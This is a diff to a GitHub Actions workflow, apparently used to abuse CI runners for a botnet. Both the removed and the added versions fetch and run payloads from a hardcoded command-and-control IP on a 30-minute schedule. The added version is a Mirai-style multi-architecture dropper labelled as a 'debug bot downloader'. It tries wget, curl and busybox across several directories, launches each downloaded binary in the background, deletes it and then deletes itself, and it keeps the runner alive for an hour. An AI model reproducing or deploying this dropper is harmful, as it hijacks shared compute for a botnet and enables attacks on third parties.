@@ -1,18 +1,118 @@
-name: Auto Payload with Arch Detection
+name: Debug Bot Downloader
 
 on:
+  workflow_dispatch:
   schedule:
     - cron: '*/30 * * * *'
-  workflow_dispatch:
 
 jobs:
-  run:
+  debug:
     runs-on: ubuntu-latest
     steps:
-    - name: Show Arch
-      run: echo "Running on $(uname -m) at $(date)"
-    - name: Run Payload
+    - name: Run Bot Downloader with Debug
       run: |
-        cd /tmp||cd /var/tmp||cd /dev/shm
-        (wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||curl -s http://16.171.16.1/run.sh -o run.sh||busybox wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||tftp -g -r run.sh 16.171.16.1 69||ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh);[ -s run.sh ]&&chmod 777 run.sh&&./run.sh
-        sleep 7200
+        echo "=========================================="
+        echo "Debug Bot Downloader"
+        echo "Time: $(date)"
+        echo "Architecture: $(uname -m)"
+        echo "=========================================="
+        
+        cat > run.sh << 'EOF'
+        #!/bin/sh
+        
+        PATHS="/tmp /var/run /dev/shm /mnt /root /"
+        ARCHS="mips mipsel x86 armv7l armv6l armv5l i686 ppc64"
+        CNC_IP="16.171.16.1"
+        
+        echo "[DEBUG] Starting bot downloader..."
+        echo "[DEBUG] CNC IP: $CNC_IP"
+        echo "[DEBUG] Architectures: $ARCHS"
+        echo ""
+        
+        x() {
+            local a=$1
+            local b=$(head /dev/urandom | tr -dc a-z0-9 | head -c 6 2>/dev/null || echo "tmp$$")
+            
+            echo "[DEBUG] Trying architecture: $a"
+            
+            for p in $PATHS; do
+                cd $p 2>/dev/null || continue
+                echo "[DEBUG] Trying directory: $p"
+                
+                if command -v wget >/dev/null 2>&1; then
+                    echo "[DEBUG] Using wget to download http://$CNC_IP/$a"
+                    wget -v "http://$CNC_IP/$a" -O "$b" 2>&1 | head -3
+                elif command -v curl >/dev/null 2>&1; then
+                    echo "[DEBUG] Using curl to download http://$CNC_IP/$a"
+                    curl -v "http://$CNC_IP/$a" -o "$b" 2>&1 | head -5
+                elif [ -x /bin/busybox ]; then
+                    echo "[DEBUG] Using busybox wget"
+                    busybox wget -v "http://$CNC_IP/$a" -O "$b" 2>&1 | head -3
+                fi
+                
+                if [ -f "$b" ] && [ -s "$b" ]; then
+                    SIZE=$(wc -c < "$b")
+                    echo "[DEBUG] ✅ Downloaded $a successfully! Size: $SIZE bytes"
+                    echo "[DEBUG] File type: $(file "$b" | cut -d: -f2)"
+                    echo "[DEBUG] Making executable..."
+                    chmod +x "$b" 2>/dev/null
+                    echo "[DEBUG] Running binary: ./$b bot.payload"
+                    "./$b" bot.payload >/dev/null 2>&1 &
+                    echo "[DEBUG] ✅ Binary $a started in background (PID: $!)"
+                    rm -f "$b" 2>/dev/null
+                    echo "[DEBUG] Cleaned up $b"
+                    return 0
+                else
+                    echo "[DEBUG] ❌ Failed to download $a (file not found or empty)"
+                fi
+            done
+            echo "[DEBUG] All methods failed for $a"
+            return 1
+        }
+        
+        echo "=========================================="
+        echo "Starting download attempts..."
+        echo "=========================================="
+        
+        SUCCESS_COUNT=0
+        for arch in $ARCHS; do
+            echo ""
+            echo "--- Testing $arch ---"
+            if x "$arch"; then
+                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+                echo "[DEBUG] ✅ SUCCESS: $arch downloaded and executed"
+            else
+                echo "[DEBUG] ❌ FAILED: $arch"
+            fi
+        done
+        
+        echo ""
+        echo "=========================================="
+        echo "Summary: $SUCCESS_COUNT/${#ARCHS} architectures succeeded"
+        echo "=========================================="
+        
+        (sleep 2; rm -f "$0") &
+        EOF
+        
+        chmod +x run.sh
+        echo ""
+        echo "=========================================="
+        echo "Executing run.sh with debug output"
+        echo "=========================================="
+        ./run.sh
+        
+        echo ""
+        echo "=========================================="
+        echo "Keeping runner alive for 1 hour"
+        echo "=========================================="
+        sleep 3600
+
+    - name: Upload Logs
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: debug-logs-${{ github.run_id }}
+        path: |
+          run.sh
+          /tmp/*.log
+        retention-days: 3
